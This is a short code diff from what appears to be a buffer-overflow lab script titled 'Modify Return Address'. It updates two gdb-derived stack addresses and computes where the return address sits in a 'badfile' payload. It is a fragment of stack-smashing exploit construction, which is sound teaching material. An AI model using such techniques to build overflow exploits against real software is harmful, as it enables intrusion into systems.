@@ -19,8 +19,8 @@ Modify Return Address
 """
 print("\n", "-"*20, "TASK A", "-"*20, "\n")
 # compute offset of "Return Address" using memory address in gdb
-address_of_target_str = 0xffffce4c  # (1) the address of target_string
-address_of_ebp = 0xffffceb8  # (2) the address of ebp
+address_of_target_str = 0xffffd49c  # (1) the address of target_string
+address_of_ebp = 0xffffd508  # (2) the address of ebp
 
 # offset of return_address in the badfile
 address_of_return_address = address_of_ebp + N_BYTES_PER_ADDRESS
